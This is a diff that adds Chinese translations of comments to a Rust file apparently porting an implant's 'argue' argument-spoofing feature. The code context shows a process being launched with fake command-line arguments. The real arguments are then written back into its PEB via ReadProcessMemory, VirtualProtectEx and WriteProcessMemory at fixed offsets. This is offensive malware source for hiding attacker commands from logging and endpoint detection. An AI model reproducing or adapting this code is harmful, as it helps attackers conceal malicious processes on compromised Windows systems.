@@ -1,3 +1,4 @@
+//! 参数欺骗（argue.cpp）。
 //! Argument spoofing (argue.cpp).
 
 use crate::bformat::FormatP;
@@ -7,6 +8,7 @@ use crate::filesys::env_expand;
 use crate::parse::{data_alloc, DataP};
 use parking_lot::Mutex;
 
+/// 参数记录（ARGUMENT_RECORD）。
 /// Argument record (ARGUMENT_RECORD).
 #[derive(Clone, Default)]
 pub struct ArgumentRecord {
@@ -25,18 +27,21 @@ static ARGUE_LIST: Mutex<Vec<ArgueEntry>> = Mutex::new(Vec::new());
 
 fn get_slot(command: &[u8]) -> usize {
     let mut list = ARGUE_LIST.lock();
+    // 查找重复项。
     // find a duplicate
     for (i, entry) in list.iter().enumerate() {
         if entry.active && entry.command == command {
             return i;
         }
     }
+    // 查找空条目。
     // find an empty entry
     for (i, entry) in list.iter().enumerate() {
         if !entry.active {
             return i;
         }
     }
+    // 分配一个新条目。
     // allocate a new entry
     list.push(ArgueEntry {
         active: false,
@@ -58,6 +63,7 @@ pub fn command_argue_add(buffer: &[u8], length: usize) {
     env_expand(&command[..clen], &mut expanded, 8192);
     let _ = parser.data_string(&mut fakeargs, 8192);
 
+    // 找到槽位并激活它。
     // find the slot and activate it
     let elen = expanded.iter().position(|&c| c == 0).unwrap_or(expanded.len());
     let idx = get_slot(&expanded[..elen]);
@@ -106,11 +112,13 @@ pub fn command_argue_list(callback: Callback) {
     format.free();
 }
 
+/// 检查指定命令是否是参数欺骗的候选。
 /// Check if the specified command is a candidate for argument spoofing.
 pub fn argue_should_spoof(buffer: &[u8], record: &mut ArgumentRecord) -> bool {
     let mut command = vec![0u8; 8192];
     let mut args = vec![0u8; 8192];
 
+    // 将缓冲区拆分为 command + args（第一个空格处）。
     // split the buffer into command + args (first space)
     let mut split = buffer.len();
     for (i, b) in buffer.iter().enumerate() {
@@ -135,6 +143,8 @@ pub fn argue_should_spoof(buffer: &[u8], record: &mut ArgumentRecord) -> bool {
     false
 }
 
+/// 将真实参数恢复到已生成进程的 PEB 中（argue_restore）。
+/// 为 x64（移植目标）实现；x86 变体是等价的。
 /// Restore real arguments into the spawned process's PEB (argue_restore).
 /// Implemented for x64 (the port target); the x86 variant is equivalent.
 pub fn argue_restore(
@@ -147,6 +157,7 @@ pub fn argue_restore(
         use windows_sys::Win32::System::Memory::VirtualProtectEx;
         let pi = pi as *mut windows_sys::Win32::System::Threading::PROCESS_INFORMATION;
 
+        // 在 wow64 上下文中可能不会起作用。
         // probably not going to work in a wow64 context
         if !crate::ps::is_x64_process((*pi).hProcess as isize) {
             crate::callback::post_error_na(0x43);
@@ -160,6 +171,7 @@ pub fn argue_restore(
             return false;
         }
 
+        // Rdx+0x20 -> RTL_USER_PROCESS_PARAMETERS（Rdx+0x20 指向进程参数）。
         // Rdx+0x20 -> RTL_USER_PROCESS_PARAMETERS
         let mut rtl_user_proc_params_address: *mut core::ffi::c_void = std::ptr::null_mut();
         if ReadProcessMemory(
@@ -174,6 +186,7 @@ pub fn argue_restore(
             return false;
         }
 
+        // +0x70 -> UNICODE_STRING commandLine（+0x70 处是命令行）。
         // +0x70 -> UNICODE_STRING commandLine
         let mut command_line: windows_sys::Win32::Foundation::UNICODE_STRING = std::mem::zeroed();
         if ReadProcessMemory(
@@ -188,6 +201,7 @@ pub fn argue_restore(
             return false;
         }
 
+        // 让权限变得合适。
         // make the permissions good
         let mut old: u32 = 0;
         if VirtualProtectEx(
@@ -202,6 +216,7 @@ pub fn argue_restore(
             return false;
         }
 
+        // 转换我们的命令行内容。
         // convert our command line contents
         let mut command_line_contents = vec![0u16; command_line.MaximumLength as usize / 2];
         if !crate::commands::to_wide_char(&record.realargs, &mut command_line_contents, command_line.MaximumLength as usize / 2) {
@@ -209,6 +224,7 @@ pub fn argue_restore(
             return false;
         }
 
+        // 推入它！
         // push it!
         let mut wrote: usize = 0;
         if WriteProcessMemory(
